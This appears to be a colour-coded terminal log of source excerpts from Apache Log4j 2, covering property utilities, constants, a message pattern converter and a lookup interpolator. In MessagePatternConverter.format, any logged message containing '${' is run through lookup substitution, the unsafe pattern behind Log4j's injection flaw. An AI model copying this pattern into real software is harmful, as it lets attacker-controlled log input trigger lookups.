[2;36m                    [0m         [1;36m40[0m[39m:        final ClassLoader loader = [0m[1;35mProviderUtil.findClassLoader[0m[1;39m([0m[1;39m)[0m[39m;[0m               [2m                [0m
[2;36m                    [0m         [1;36m41[0m[39m:        final InputStream in = [0m[1;35mloader.getResourceAsStream[0m[1;39m([0m[39mpropsLocn[0m[1;39m)[0m[39m;[0m            [2m                [0m
[2;36m                    [0m         [1;36m42[0m[39m:        if [0m[1;39m([0m[39mnull != in[0m[1;39m)[0m[39m [0m[1;39m{[0m                                                        [2m                [0m
[2;36m                    [0m         [1;36m43[0m[39m:            try [0m[1;39m{[0m                                                                [2m                [0m
[2;36m                    [0m         [1;36m44[0m[39m:                [0m[1;35mthis.props.load[0m[1;39m([0m[39min[0m[1;39m)[0m[39m;[0m                                             [2m                [0m
[2;36m                    [0m         [1;36m45[0m[39m:            [0m[1;39m}[0m[39m catch [0m[1;39m([0m[39mfinal IOException e[0m[1;39m)[0m[39m [0m[1;39m{[0m                                      [2m                [0m
[2;36m                    [0m         [1;36m46[0m[39m:                [0m[35m/[0m[35m/[0m[39m ignored[0m                                                       [2m                [0m
[2;36m                    [0m         [1;36m47[0m[39m:            [0m[1;39m}[0m[39m finally [0m[1;39m{[0m                                                          [2m                [0m
[2;36m                    [0m         [1;36m48[0m[39m:                try [0m[1;39m{[0m                                                            [2m                [0m
[2;36m                    [0m         [1;36m49[0m[39m:                    [0m[1;35min.close[0m[1;39m([0m[1;39m)[0m[39m;[0m                                                  [2m                [0m
[2;36m                    [0m         [1;36m50[0m[39m:                [0m[1;39m}[0m[39m catch [0m[1;39m([0m[39mfinal IOException e[0m[1;39m)[0m[39m [0m[1;39m{[0m                                  [2m                [0m
[2;36m                    [0m         [1;36m51[0m[39m:                    [0m[35m/[0m[35m/[0m[39m ignored[0m                                                   [2m                [0m
[2;36m                    [0m         [1;36m52[0m[39m:                [0m[1;39m}[0m                                                                [2m                [0m
[2;36m                    [0m         [1;36m53[0m[39m:            [0m[1;39m}[0m                                                                    [2m                [0m
[2;36m                    [0m         [1;36m54[0m[39m:        [0m[1;39m}[0m                                                                        [2m                [0m
[2;36m                    [0m         [1;36m55[0m[39m:    [0m[1;39m}[0m                                                                            [2m                [0m
[2;36m                    [0m         [1;36m56[0m[39m:[0m                                                                                 [2m                [0m
[2;36m                    [0m         [1;36m57[0m[39m:    public static PropertiesUtil [0m[1;35mgetProperties[0m[1;39m([0m[1;39m)[0m[39m [0m[1;39m{[0m                               [2m                [0m
[2;36m                    [0m         [1;36m58[0m[39m:        return LOG4J_PROPERTIES;[0m                                                 [2m                [0m
[2;36m                    [0m         [1;36m59[0m[39m:    [0m[1;39m}[0m                                                                            [2m                [0m
[2;36m                    [0m         [1;36m60[0m[39m:[0m                                                                                 [2m                [0m
[2;36m                    [0m         [1;36m61[0m[39m:    public String [0m[1;35mgetStringProperty[0m[1;39m([0m[39mfinal String name[0m[1;39m)[0m[39m [0m[1;39m{[0m                         [2m                [0m
[2;36m                    [0m         [1;36m62[0m[39m:        String prop = null;[0m                                                      [2m                [0m
[2;36m                    [0m         [1;36m63[0m[39m:        try [0m[1;39m{[0m                                                                    [2m                [0m
[2;36m                    [0m         [1;36m64[0m[39m:            prop = [0m[1;35mSystem.getProperty[0m[1;39m([0m[39mname[0m[1;39m)[0m[39m;[0m                                     [2m                [0m
[2;36m                    [0m         [1;36m65[0m[39m:        [0m[1;39m}[0m[39m catch [0m[1;39m([0m[39mfinal SecurityException e[0m[1;39m)[0m[39m [0m[1;39m{[0m                                    [2m                [0m
[2;36m                    [0m         [1;36m66[0m[39m:            [0m[35m/[0m[35m/[0m[39m Ignore[0m                                                            [2m                [0m
[2;36m                    [0m         [1;36m67[0m[39m:        [0m[1;39m}[0m                                                                        [2m                [0m
[2;36m                    [0m         [1;36m68[0m[39m:        return [0m[1;39m([0m[39mprop == null[0m[1;39m)[0m[39m ? [0m[1;35mprops.getProperty[0m[1;39m([0m[39mname[0m[1;39m)[0m[39m : prop;[0m                  [2m                [0m
[2;36m                    [0m         [1;36m69[0m[39m:    [0m[1;39m}[0m                                                                            [2m                [0m
[2;36m                    [0m         [1;36m70[0m[39m:[0m                                                                                 [2m                [0m
[2;36m                    [0m         [39m```[0m                                                                                 [2m                [0m
[2;36m                    [0m         [39m<[0m[35m/[0m[95mcode[0m[39m>[0m                                                                             [2m                [0m
[2;36m                    [0m         [39m<code>[0m                                                                              [2m                [0m
[2;36m                    [0m         [39mapi/src/main/java/org/apache/logging/log4j/util/PropertiesUtil.jav[0m[1;92ma:118[0m[39m-[0m[1;36m125[0m         [2m                [0m
[2;36m                    [0m         [39m```[0m                                                                                 [2m                [0m
[2;36m                    [0m         [1;36m118[0m[39m:    public boolean [0m[1;35mgetBooleanProperty[0m[1;39m([0m[39mfinal String name[0m[1;39m)[0m[39m [0m[1;39m{[0m                      [2m                [0m
[2;36m                    [0m         [1;36m119[0m[39m:        return [0m[1;35mgetBooleanProperty[0m[1;39m([0m[39mname, false[0m[1;39m)[0m[39m;[0m                                 [2m                [0m
[2;36m                    [0m         [1;36m120[0m[39m:    [0m[1;39m}[0m                                                                           [2m                [0m
[2;36m                    [0m         [1;36m121[0m[39m:[0m                                                                                [2m                [0m
[2;36m                    [0m         [1;36m122[0m[39m:    public boolean [0m[1;35mgetBooleanProperty[0m[1;39m([0m[39mfinal String name, final boolean [0m         [2m                [0m
[2;36m                    [0m         [39mdefaultValue[0m[1;39m)[0m[39m [0m[1;39m{[0m                                                                     [2m                [0m
[2;36m                    [0m         [1;36m123[0m[39m:        final String prop = [0m[1;35mgetStringProperty[0m[1;39m([0m[39mname[0m[1;39m)[0m[39m;[0m                            [2m                [0m
[2;36m                    [0m         [1;36m124[0m[39m:        return [0m[1;39m([0m[39mprop == null[0m[1;39m)[0m[39m ? defaultValue : [0m[32m"true"[0m[1;35m.equalsIgnoreCase[0m[1;39m([0m[39mprop[0m[1;39m)[0m[39m;[0m   [2m                [0m
[2;36m                    [0m         [1;36m125[0m[39m:    [0m[1;39m}[0m                                                                           [2m                [0m
[2;36m                    [0m         [39m```[0m                                                                                 [2m                [0m
[2;36m                    [0m         [39m<[0m[35m/[0m[95mcode[0m[39m>[0m                                                                             [2m                [0m
[2;36m                    [0m         [39m<code>[0m                                                                              [2m                [0m
[2;36m                    [0m         [39mcore/src/main/java/org/apache/logging/log4j/core/helpers/Constants.jav[0m[1;92ma:1[0m[39m-[0m[1;36m58[0m        [2m                [0m
[2;36m                    [0m         [39m```[0m                                                                                 [2m                [0m
[2;36m                    [0m         [1;36m1[0m[39m:[0m[35m/[0m[39m*[0m                                                                                [2m                [0m
[2;36m                    [0m         [1;36m2[0m[39m: * Licensed to the Apache Software Foundation [0m[1;39m([0m[39mASF[0m[1;39m)[0m[39m under one or more[0m             [2m                [0m
[2;36m                    [0m         [1;36m3[0m[39m: * contributor license agreements. See the NOTICE file distributed with[0m           [2m                [0m
[2;36m                    [0m         [1;36m4[0m[39m: * this work for additional information regarding copyright ownership.[0m            [2m                [0m
[2;36m                    [0m         [1;36m5[0m[39m: * The ASF licenses this file to You under the Apache license, Version [0m[1;36m2.0[0m        [2m                [0m
[2;36m                    [0m         [1;36m6[0m[39m: * [0m[1;39m([0m[39mthe [0m[32m"License"[0m[1;39m)[0m[39m; you may not use this file except in compliance with[0m           [2m                [0m
[2;36m                    [0m         [1;36m7[0m[39m: * the License. You may obtain a copy of the License at[0m                           [2m                [0m
[2;36m                    [0m         [1;36m8[0m[39m: *[0m                                                                                [2m                [0m
[2;36m                    [0m         [1;36m9[0m[39m: *      [0m[4;94mhttp://www.apache.org/licenses/LICENSE-2.0[0m                                [2m                [0m
[2;36m                    [0m         [1;36m10[0m[39m: *[0m                                                                               [2m                [0m
[2;36m                    [0m         [1;36m11[0m[39m: * Unless required by applicable law or agreed to in writing, software[0m           [2m                [0m
[2;36m                    [0m         [1;36m12[0m[39m: * distributed under the License is distributed on an [0m[32m"AS IS"[0m[39m BASIS,[0m             [2m                [0m
[2;36m                    [0m         [1;36m13[0m[39m: * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.[0m      [2m                [0m
[2;36m                    [0m         [1;36m14[0m[39m: * See the license for the specific language governing permissions and[0m           [2m                [0m
[2;36m                    [0m         [1;36m15[0m[39m: * limitations under the license.[0m                                                [2m                [0m
[2;36m                    [0m         [1;36m16[0m[39m: *[0m[35m/[0m                                                                              [2m                [0m
[2;36m                    [0m         [1;36m17[0m[39m:package org.apache.logging.log4j.core.helpers;[0m                                   [2m                [0m
[2;36m                    [0m         [1;36m18[0m[39m:[0m                                                                                 [2m                [0m
[2;36m                    [0m         [1;36m19[0m[39m:import org.apache.logging.log4j.util.PropertiesUtil;[0m                             [2m                [0m
[2;36m                    [0m         [1;36m20[0m[39m:[0m                                                                                 [2m                [0m
[2;36m                    [0m         [1;36m21[0m[39m:[0m[35m/[0m[39m**[0m                                                                              [2m                [0m
[2;36m                    [0m         [1;36m22[0m[39m: * Log4j Constants.[0m                                                              [2m                [0m
[2;36m                    [0m         [1;36m23[0m[39m: *[0m[35m/[0m                                                                              [2m                [0m
[2;36m                    [0m         [1;36m24[0m[39m:public final class Constants [0m[1;39m{[0m                                                   [2m                [0m
[2;36m                    [0m         [1;36m25[0m[39m:[0m                                                                                 [2m                [0m
[2;36m                    [0m         [1;36m26[0m[39m:    [0m[35m/[0m[39m**[0m                                                                          [2m                [0m
[2;36m                    [0m         [1;36m27[0m[39m:     * Name of the system property to use to identify the LogEvent factory.[0m      [2m                [0m
[2;36m                    [0m         [1;36m28[0m[39m:     *[0m[35m/[0m                                                                          [2m                [0m
[2;36m                    [0m         [1;36m29[0m[39m:    public static final String LOG4J_LOG_EVENT_FACTORY = [0m[32m"Log4jLogEventFactory"[0m[39m;[0m [2m                [0m
[2;36m                    [0m         [1;36m30[0m[39m:[0m                                                                                 [2m                [0m
[2;36m                    [0m         [1;36m31[0m[39m:    [0m[35m/[0m[39m**[0m                                                                          [2m                [0m
[2;36m                    [0m         [1;36m32[0m[39m:     * Name of the system property to use to identify the ContextSelector Class.[0m [2m                [0m
[2;36m                    [0m         [1;36m33[0m[39m:     *[0m[35m/[0m                                                                          [2m                [0m
[2;36m                    [0m         [1;36m34[0m[39m:    public static final String LOG4J_CONTEXT_SELECTOR = [0m[32m"Log4jContextSelector"[0m[39m;[0m  [2m                [0m
[2;36m                    [0m         [1;36m35[0m[39m:[0m                                                                                 [2m                [0m
[2;36m                    [0m         [1;36m36[0m[39m:    public static final String LOG4J_DEFAULT_STATUS_LEVEL = [0m                     [2m                [0m
[2;36m                    [0m         [32m"Log4jDefaultStatusLevel"[0m[39m;[0m                                                          [2m                [0m
[2;36m                    [0m         [1;36m37[0m[39m:[0m                                                                                 [2m                [0m
[2;36m                    [0m         [1;36m38[0m[39m:    [0m[35m/[0m[39m**[0m                                                                          [2m                [0m
[2;36m                    [0m         [1;36m39[0m[39m:     * JNDI context name string literal.[0m                                         [2m                [0m
[2;36m                    [0m         [1;36m40[0m[39m:     *[0m[35m/[0m                                                                          [2m                [0m
[2;36m                    [0m         [1;36m41[0m[39m:    public static final String JNDI_CONTEXT_NAME = [0m                              [2m                [0m
[2;36m                    [0m         [32m"java:comp/env/log4j/context-name"[0m[39m;[0m                                                 [2m                [0m
[2;36m                    [0m         [1;36m42[0m[39m:[0m                                                                                 [2m                [0m
[2;36m                    [0m         [1;36m43[0m[39m:    [0m[35m/[0m[39m**[0m                                                                          [2m                [0m
[2;36m                    [0m         [1;36m44[0m[39m:     * Line separator.[0m                                                           [2m                [0m
[2;36m                    [0m         [1;36m45[0m[39m:     *[0m[35m/[0m                                                                          [2m                [0m
[2;36m                    [0m         [1;36m46[0m[39m:    public static final String LINE_SEP = [0m                                       [2m                [0m
[2;36m                    [0m         [1;35mPropertiesUtil.getProperties[0m[1;39m([0m[1;39m)[0m[1;35m.getStringProperty[0m[1;39m([0m[32m"line.separator"[0m[39m, [0m[32m"\n"[0m[1;39m)[0m[39m;[0m           [2m                [0m
[2;36m                    [0m         [1;36m47[0m[39m:[0m                                                                                 [2m                [0m
[2;36m                    [0m         [1;36m48[0m[39m:    [0m[35m/[0m[39m**[0m                                                                          [2m                [0m
[2;36m                    [0m         [1;36m49[0m[39m:     * Number of milliseconds in a second.[0m                                       [2m                [0m
[2;36m                    [0m         [1;36m50[0m[39m:     *[0m[35m/[0m                                                                          [2m                [0m
[2;36m                    [0m         [1;36m51[0m[39m:    public static final int MILLIS_IN_SECONDS = [0m[1;36m1000[0m[39m;[0m                            [2m                [0m
[2;36m                    [0m         [1;36m52[0m[39m:[0m                                                                                 [2m                [0m
[2;36m                    [0m         [1;36m53[0m[39m:    [0m[35m/[0m[39m**[0m                                                                          [2m                [0m
[2;36m                    [0m         [1;36m54[0m[39m:     * Prevent class instantiation.[0m                                              [2m                [0m
[2;36m                    [0m         [1;36m55[0m[39m:     *[0m[35m/[0m                                                                          [2m                [0m
[2;36m                    [0m         [1;36m56[0m[39m:    private [0m[1;35mConstants[0m[1;39m([0m[1;39m)[0m[39m [0m[1;39m{[0m                                                        [2m                [0m
[2;36m                    [0m         [1;36m57[0m[39m:    [0m[1;39m}[0m                                                                            [2m                [0m
[2;36m                    [0m         [1;36m58[0m[39m:[0m[1;39m}[0m                                                                                [2m                [0m
[2;36m                    [0m         [39m```[0m                                                                                 [2m                [0m
[2;36m                    [0m         [39m<[0m[35m/[0m[95mcode[0m[39m>[0m                                                                             [2m                [0m
[2;36m                    [0m         [39m<code>[0m                                                                              [2m                [0m
[2;36m                    [0m         [39mcore/src/main/java/org/apache/logging/log4j/core/pattern/MessagePatternConverter.ja[0m [2m                [0m
[2;36m                    [0m         [39mv[0m[1;92ma:1[0m[39m-[0m[1;36m23[0m                                                                             [2m                [0m
[2;36m                    [0m         [39m```[0m                                                                                 [2m                [0m
[2;36m                    [0m         [1;36m1[0m[39m:[0m[35m/[0m[39m*[0m                                                                                [2m                [0m
[2;36m                    [0m         [1;36m2[0m[39m: * Licensed to the Apache Software Foundation [0m[1;39m([0m[39mASF[0m[1;39m)[0m[39m under one or more[0m             [2m                [0m
[2;36m                    [0m         [1;36m3[0m[39m: * contributor license agreements. See the NOTICE file distributed with[0m           [2m                [0m
[2;36m                    [0m         [1;36m4[0m[39m: * this work for additional information regarding copyright ownership.[0m            [2m                [0m
[2;36m                    [0m         [1;36m5[0m[39m: * The ASF licenses this file to You under the Apache license, Version [0m[1;36m2.0[0m        [2m                [0m
[2;36m                    [0m         [1;36m6[0m[39m: * [0m[1;39m([0m[39mthe [0m[32m"License"[0m[1;39m)[0m[39m; you may not use this file except in compliance with[0m           [2m                [0m
[2;36m                    [0m         [1;36m7[0m[39m: * the License. You may obtain a copy of the License at[0m                           [2m                [0m
[2;36m                    [0m         [1;36m8[0m[39m: *[0m                                                                                [2m                [0m
[2;36m                    [0m         [1;36m9[0m[39m: *      [0m[4;94mhttp://www.apache.org/licenses/LICENSE-2.0[0m                                [2m                [0m
[2;36m                    [0m         [1;36m10[0m[39m: *[0m                                                                               [2m                [0m
[2;36m                    [0m         [1;36m11[0m[39m: * Unless required by applicable law or agreed to in writing, software[0m           [2m                [0m
[2;36m                    [0m         [1;36m12[0m[39m: * distributed under the License is distributed on an [0m[32m"AS IS"[0m[39m BASIS,[0m             [2m                [0m
[2;36m                    [0m         [1;36m13[0m[39m: * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.[0m      [2m                [0m
[2;36m                    [0m         [1;36m14[0m[39m: * See the license for the specific language governing permissions and[0m           [2m                [0m
[2;36m                    [0m         [1;36m15[0m[39m: * limitations under the license.[0m                                                [2m                [0m
[2;36m                    [0m         [1;36m16[0m[39m: *[0m[35m/[0m                                                                              [2m                [0m
[2;36m                    [0m         [1;36m17[0m[39m:package org.apache.logging.log4j.core.pattern;[0m                                   [2m                [0m
[2;36m                    [0m         [1;36m18[0m[39m:[0m                                                                                 [2m                [0m
[2;36m                    [0m         [1;36m19[0m[39m:import org.apache.logging.log4j.core.LogEvent;[0m                                   [2m                [0m
[2;36m                    [0m         [1;36m20[0m[39m:import org.apache.logging.log4j.core.config.Configuration;[0m                       [2m                [0m
[2;36m                    [0m         [1;36m21[0m[39m:import org.apache.logging.log4j.core.config.plugins.Plugin;[0m                      [2m                [0m
[2;36m                    [0m         [1;36m22[0m[39m:import org.apache.logging.log4j.message.Message;[0m                                 [2m                [0m
[2;36m                    [0m         [1;36m23[0m[39m:import org.apache.logging.log4j.message.MultiformatMessage;[0m                      [2m                [0m
[2;36m                    [0m         [39m```[0m                                                                                 [2m                [0m
[2;36m                    [0m         [39m<[0m[35m/[0m[95mcode[0m[39m>[0m                                                                             [2m                [0m
[2;36m                    [0m         [39m<code>[0m                                                                              [2m                [0m
[2;36m                    [0m         [39mcore/src/main/java/org/apache/logging/log4j/core/pattern/MessagePatternConverter.ja[0m [2m                [0m
[2;36m                    [0m         [39mv[0m[1;92ma:57[0m[39m-[0m[1;36m78[0m                                                                            [2m                [0m
[2;36m                    [0m         [39m```[0m                                                                                 [2m                [0m
[2;36m                    [0m         [1;36m57[0m[39m:    [0m[35m/[0m[39m**[0m                                                                          [2m                [0m
[2;36m                    [0m         [1;36m58[0m[39m:     * [0m[1;39m{[0m[39m@inheritDoc[0m[1;39m}[0m                                                             [2m                [0m
[2;36m                    [0m         [1;36m59[0m[39m:     *[0m[35m/[0m                                                                          [2m                [0m
[2;36m                    [0m         [1;36m60[0m[39m:    @Override[0m                                                                    [2m                [0m
[2;36m                    [0m         [1;36m61[0m[39m:    public void [0m[1;35mformat[0m[1;39m([0m[39mfinal LogEvent event, final StringBuilder toAppendTo[0m[1;39m)[0m[39m [0m[1;39m{[0m   [2m                [0m
[2;36m                    [0m         [1;36m62[0m[39m:        final Message msg = [0m[1;35mevent.getMessage[0m[1;39m([0m[1;39m)[0m[39m;[0m                                  [2m                [0m
[2;36m                    [0m         [1;36m63[0m[39m:        if [0m[1;39m([0m[39mmsg != null[0m[1;39m)[0m[39m [0m[1;39m{[0m                                                       [2m                [0m
[2;36m                    [0m         [1;36m64[0m[39m:            String result;[0m                                                       [2m                [0m
[2;36m                    [0m         [1;36m65[0m[39m:            if [0m[1;39m([0m[39mmsg instanceof MultiformatMessage[0m[1;39m)[0m[39m [0m[1;39m{[0m                             [2m                [0m
[2;36m                    [0m         [1;36m66[0m[39m:                result = [0m[1;39m([0m[1;39m([0m[39mMultiformatMessage[0m[1;39m)[0m[39m [0m                                  [2m                [0m
[2;36m                    [0m         [39mmsg[0m[1;39m)[0m[1;35m.getFormattedMessage[0m[1;39m([0m[39mformats[0m[1;39m)[0m[39m;[0m                                                  [2m                [0m
[2;36m                    [0m         [1;36m67[0m[39m:            [0m[1;39m}[0m[39m else [0m[1;39m{[0m                                                             [2m                [0m
[2;36m                    [0m         [1;36m68[0m[39m:                result = [0m[1;35mmsg.getFormattedMessage[0m[1;39m([0m[1;39m)[0m[39m;[0m                              [2m                [0m
[2;36m                    [0m         [1;36m69[0m[39m:            [0m[1;39m}[0m                                                                    [2m                [0m
[2;36m                    [0m         [1;36m70[0m[39m:            if [0m[1;39m([0m[39mresult != null[0m[1;39m)[0m[39m [0m[1;39m{[0m                                                [2m                [0m
[2;36m                    [0m         [1;36m71[0m[39m:                [0m[1;35mtoAppendTo.append[0m[1;39m([0m[39mconfig != null && [0m[1;35mresult.contains[0m[1;39m([0m[32m"$[0m[32m{[0m[32m"[0m[1;39m)[0m[39m ?[0m      [2m                [0m
[2;36m                    [0m         [1;36m72[0m[39m:                    [0m[1;35mconfig.getSubst[0m[1;39m([0m[1;39m)[0m[1;35m.replace[0m[1;39m([0m[39mevent, result[0m[1;39m)[0m[39m : result[0m[1;39m)[0m[39m;[0m          [2m                [0m
[2;36m                    [0m         [1;36m73[0m[39m:            [0m[1;39m}[0m[39m else [0m[1;39m{[0m                                                             [2m                [0m
[2;36m                    [0m         [1;36m74[0m[39m:                [0m[1;35mtoAppendTo.append[0m[1;39m([0m[32m"null"[0m[1;39m)[0m[39m;[0m                                       [2m                [0m
[2;36m                    [0m         [1;36m75[0m[39m:            [0m[1;39m}[0m                                                                    [2m                [0m
[2;36m                    [0m         [1;36m76[0m[39m:        [0m[1;39m}[0m                                                                        [2m                [0m
[2;36m                    [0m         [1;36m77[0m[39m:    [0m[1;39m}[0m                                                                            [2m                [0m
[2;36m                    [0m         [1;36m78[0m[39m:[0m[1;39m}[0m                                                                                [2m                [0m
[2;36m                    [0m         [39m```[0m                                                                                 [2m                [0m
[2;36m                    [0m         [39m<[0m[35m/[0m[95mcode[0m[39m>[0m                                                                             [2m                [0m
[2;36m                    [0m         [39m<code>[0m                                                                              [2m                [0m
[2;36m                    [0m         [39mcore/src/main/java/org/apache/logging/log4j/core/lookup/Interpolator.jav[0m[1;92ma:1[0m[39m-[0m[1;36m27[0m      [2m                [0m
[2;36m                    [0m         [39m```[0m                                                                                 [2m                [0m
[2;36m                    [0m         [1;36m1[0m[39m:[0m[35m/[0m[39m*[0m                                                                                [2m                [0m
[2;36m                    [0m         [1;36m2[0m[39m: * Licensed to the Apache Software Foundation [0m[1;39m([0m[39mASF[0m[1;39m)[0m[39m under one or more[0m             [2m                [0m
[2;36m                    [0m         [1;36m3[0m[39m: * contributor license agreements. See the NOTICE file distributed with[0m           [2m                [0m
[2;36m                    [0m         [1;36m4[0m[39m: * this work for additional information regarding copyright ownership.[0m            [2m                [0m
[2;36m                    [0m         [1;36m5[0m[39m: * The ASF licenses this file to You under the Apache license, Version [0m[1;36m2.0[0m        [2m                [0m
[2;36m                    [0m         [1;36m6[0m[39m: * [0m[1;39m([0m[39mthe [0m[32m"License"[0m[1;39m)[0m[39m; you may not use this file except in compliance with[0m           [2m                [0m
[2;36m                    [0m         [1;36m7[0m[39m: * the License. You may obtain a copy of the License at[0m                           [2m                [0m
[2;36m                    [0m         [1;36m8[0m[39m: *[0m                                                                                [2m                [0m
[2;36m                    [0m         [1;36m9[0m[39m: *      [0m[4;94mhttp://www.apache.org/licenses/LICENSE-2.0[0m                                [2m                [0m
[2;36m                    [0m         [1;36m10[0m[39m: *[0m                                                                               [2m                [0m
[2;36m                    [0m         [1;36m11[0m[39m: * Unless required by applicable law or agreed to in writing, software[0m           [2m                [0m
[2;36m                    [0m         [1;36m12[0m[39m: * distributed under the License is distributed on an [0m[32m"AS IS"[0m[39m BASIS,[0m             [2m                [0m
[2;36m                    [0m         [1;36m13[0m[39m: * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.[0m      [2m                [0m
[2;36m                    [0m         [1;36m14[0m[39m: * See the license for the specific language governing permissions and[0m           [2m                [0m
[2;36m                    [0m         [1;36m15[0m[39m: * limitations under the license.[0m                                                [2m                [0m
[2;36m                    [0m         [1;36m16[0m[39m: *[0m[35m/[0m                                                                              [2m                [0m
[2;36m                    [0m         [1;36m17[0m[39m:package org.apache.logging.log4j.core.lookup;[0m                                    [2m                [0m
[2;36m                    [0m         [1;36m18[0m[39m:[0m                                                                                 [2m                [0m
[2;36m                    [0m         [1;36m19[0m[39m:import java.util.HashMap;[0m                                                        [2m                [0m
[2;36m                    [0m         [1;36m20[0m[39m:import java.util.Map;[0m                                                            [2m                [0m
[2;36m                    [0m         [1;36m21[0m[39m:[0m                                                                                 [2m                [0m
[2;36m                    [0m         [1;36m22[0m[39m:import org.apache.logging.log4j.Logger;[0m                                          [2m                [0m
[2;36m                    [0m         [1;36m23[0m[39m:import org.apache.logging.log4j.core.LogEvent;[0m                                   [2m                [0m
[2;36m                    [0m         [1;36m24[0m[39m:import org.apache.logging.log4j.core.config.plugins.PluginManager;[0m               [2m                [0m
[2;36m                    [0m         [1;36m25[0m[39m:import org.apache.logging.log4j.core.config.plugins.PluginType;[0m                  [2m                [0m
[2;36m                    [0m         [1;36m26[0m[39m:import org.apache.logging.log4j.status.StatusLogger;[0m                             [2m                [0m
[2;36m                    [0m         [1;36m27[0m[39m:[0m                                                                                 [2m                [0m
[2;36m                    [0m         [39m```[0m                                                                                 [2m                [0m
[2;36m                    [0m         [39m<[0m[35m/[0m[95mcode[0m[39m>[0m                                                                             [2m                [0m
[2;36m                    [0m         [39m<code>[0m                                                                              [2m                [0m
[2;36m                    [0m         [39mcore/src/main/java/org/apache/logging/log4j/core/lookup/Interpolator.jav[0m[1;92ma:36[0m[39m-[0m[1;36m67[0m     [2m                [0m
[2;36m                    [0m         [39m```[0m                                                                                 [2m                [0m
[2;36m                    [0m         [1;36m36[0m[39m:    private static final char PREFIX_SEPARATOR = [0m[32m':'[0m[39m;[0m                            [2m                [0m
[2;36m                    [0m         [1;36m37[0m[39m:[0m                                                                                 [2m                [0m
[2;36m                    [0m         [1;36m38[0m[39m:    private final Map<String, StrLookup> lookups = new HashMap<String, [0m          [2m                [0m
[2;36m                    [0m         [39mStrLookup>[0m[1;39m([0m[1;39m)[0m[39m;[0m                                                                       [2m                [0m
[2;36m                    [0m         [1;36m39[0m[39m:[0m                                                                                 [2m                [0m
[2;36m                    [0m         [1;36m40[0m[39m:    private final StrLookup defaultLookup;[0m                                       [2m                [0m
[2;36m                    [0m         [1;36m41[0m[39m:[0m                                                                                 [2m                [0m
[2;36m                    [0m         [1;36m42[0m[39m:    public [0m[1;35mInterpolator[0m[1;39m([0m[39mfinal StrLookup defaultLookup[0m[1;39m)[0m[39m [0m[1;39m{[0m                         [2m                [0m
[2;36m                    [0m         [1;36m43[0m[39m:        this.defaultLookup = defaultLookup == null ? new [0m[1;35mMapLookup[0m[1;39m([0m[39mnew [0m          [2m                [0m
[2;36m                    [0m         [39mHashMap<String, String>[0m[1;39m([0m[1;39m)[0m[1;39m)[0m[39m : defaultLookup;[0m                                         [2m                [0m
[2;36m                    [0m         [1;36m44[0m[39m:        final PluginManager manager = new [0m[1;35mPluginManager[0m[1;39m([0m[32m"Lookup"[0m[1;39m)[0m[39m;[0m               [2m                [0m
[2;36m                    [0m         [1;36m45[0m[39m:        [0m[1;35mmanager.collectPlugins[0m[1;39m([0m[1;39m)[0m[39m;[0m                                                [2m                [0m
[2;36m                    [0m         [1;36m46[0m[39m:        final Map<String, PluginType> plugins = [0m[1;35mmanager.getPlugins[0m[1;39m([0m[1;39m)[0m[39m;[0m            [2m                [0m
[2;36m                    [0m         [1;36m47[0m[39m:[0m                                                                                 [2m                [0m
[2;36m                    [0m         [1;36m48[0m[39m:        for [0m[1;39m([0m[39mfinal Map.Entry<String, PluginType> entry : [0m[1;35mplugins.entrySet[0m[1;39m([0m[1;39m)[0m[1;39m)[0m[39m [0m[1;39m{[0m   [2m                [0m
[2;36m                    [0m         [1;36m49[0m[39m:            @[0m[1;35mSuppressWarnings[0m[1;39m([0m[32m"unchecked"[0m[1;39m)[0m                                       [2m                [0m
[2;36m                    [0m         [1;36m50[0m[39m:            final Class<StrLookup> clazz = [0m[1;35mentry.getValue[0m[1;39m([0m[1;39m)[0m[1;35m.getPluginClass[0m[1;39m([0m[1;39m)[0m[39m;[0m    [2m                [0m
[2;36m                    [0m         [1;36m51[0m[39m:            try [0m[1;39m{[0m                                                                [2m                [0m
[2;36m                    [0m         [1;36m52[0m[39m:                [0m[1;35mlookups.put[0m[1;39m([0m[1;35mentry.getKey[0m[1;39m([0m[1;39m)[0m[39m, [0m[1;35mclazz.newInstance[0m[1;39m([0m[1;39m)[0m[1;39m)[0m[39m;[0m                [2m                [0m
[2;36m                    [0m         [1;36m53[0m[39m:            [0m[1;39m}[0m[39m catch [0m[1;39m([0m[39mfinal Exception ex[0m[1;39m)[0m[39m [0m[1;39m{[0m                                       [2m                [0m
[2;36m                    [0m         [1;36m54[0m[39m:                [0m[1;35mLOGGER.error[0m[1;39m([0m[32m"Unable to create Lookup for "[0m[39m + [0m[1;35mentry.getKey[0m[1;39m([0m[1;39m)[0m[39m, [0m   [2m                [0m
[2;36m                    [0m         [39mex[0m[1;39m)[0m[39m;[0m                                                                                [2m                [0m
[2;36m                    [0m         [1;36m55[0m[39m:            [0m[1;39m}[0m                                                                    [2m                [0m
[2;36m                    [0m         [1;36m56[0m[39m:        [0m[1;39m}[0m                                                                        [2m                [0m
[2;36m                    [0m         [1;36m57[0m[39m:    [0m[1;39m}[0m                                                                            [2m                [0m
[2;36m                    [0m         [1;36m58[0m[39m:[0m                                                                                 [2m                [0m
[2;36m                    [0m         [1;36m59[0m[39m:    [0m[35m/[0m[39m**[0m                                                                          [2m                [0m
[2;36m                    [0m         [1;36m60[0m[39m:     * Create the default Interpolator using only Lookups that work without an [0m  [2m                [0m
[2;36m                    [0m         [39mevent.[0m                                                                              [2m                [0m
[2;36m                    [0m         [1;36m61[0m[39m:     *[0m[35m/[0m                                                                          [2m                [0m
[2;36m                    [0m         [1;36m62[0m[39m:    public [0m[1;35mInterpolator[0m[1;39m([0m[1;39m)[0m[39m [0m[1;39m{[0m                                                      [2m                [0m
[2;36m                    [0m         [1;36m63[0m[39m:        this.defaultLookup = new [0m[1;35mMapLookup[0m[1;39m([0m[39mnew HashMap<String, String>[0m[1;39m([0m[1;39m)[0m[1;39m)[0m[39m;[0m       [2m                [0m
[2;36m                    [0m         [1;36m64[0m[39m:        [0m[1;35mlookups.put[0m[1;39m([0m[32m"sys"[0m[39m, new [0m[1;35mSystemPropertiesLookup[0m[1;39m([0m[1;39m)[0m[1;39m)[0m[39m;[0m                        [2m                [0m
[2;36m                    [0m         [1;36m65[0m[39m:        [0m[1;35mlookups.put[0m[1;39m([0m[32m"env"[0m[39m, new [0m[1;35mEnvironmentLookup[0m[1;39m([0m[1;39m)[0m[1;39m)[0m[39m;[0m                             [2m                [0m
